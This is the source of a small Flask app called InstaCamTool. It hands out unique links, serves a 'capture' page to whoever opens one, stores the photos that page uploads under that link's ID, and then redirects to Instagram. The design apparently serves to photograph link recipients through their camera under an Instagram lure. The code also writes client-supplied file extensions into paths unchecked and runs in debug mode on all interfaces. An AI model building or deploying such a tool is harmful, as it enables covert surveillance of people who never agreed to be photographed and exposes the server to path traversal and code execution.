# InstaCamTool/app.py
import os
import base64
import io
from datetime import datetime
from flask import Flask, render_template, request, jsonify, redirect, url_for

app = Flask(__name__)

# Store photos in this folder
UPLOAD_FOLDER = "uploads"
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
app.config["UPLOAD_FOLDER"] = UPLOAD_FOLDER

# ----- Home page (creates a unique link) -----
@app.route("/")
def home():
    # Generate a short random ID for the link
    unique_id = base64.urlsafe_b64encode(os.urandom(6)).decode()
    link = url_for("capture_page", uid=unique_id, _external=True)
    return render_template("index.html", link=link)

# ----- Page shown to the visitor ----- 
@app.route("/capture/<uid>")
def capture_page(uid):
    # We could store the UID in a DB, but for demo we just forward it
    return render_template("capture.html", uid=uid)

# ----- Endpoint that receives the photo -----
@app.route("/upload_photo/<uid>", methods=["POST"])
def upload_photo(uid):
    try:
        data = request.json
        image_data = data["image"]          # base64 string
        header, img_b64 = image_data.split(";base64,")
        ext = header.split("/")[-1]          # png, jpg, ...

        filename = f"{uid}_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}.{ext}"
        path = os.path.join(app.config["UPLOAD_FOLDER"], filename)

        with open(path, "wb") as f:
            f.write(base64.b64decode(img_b64))

        # You can do something with the file here (send email, store in DB, etc.)
        return jsonify({"status": "success", "filename": filename})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 400

# ----- Optional: redirect after photo (Instagram) -----
@app.route("/thankyou")
def thankyou():
    return redirect("https://www.instagram.com/")

if __name__ == "__main__":
    # Render / Heroku listen on all interfaces
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 5000)), debug=True)
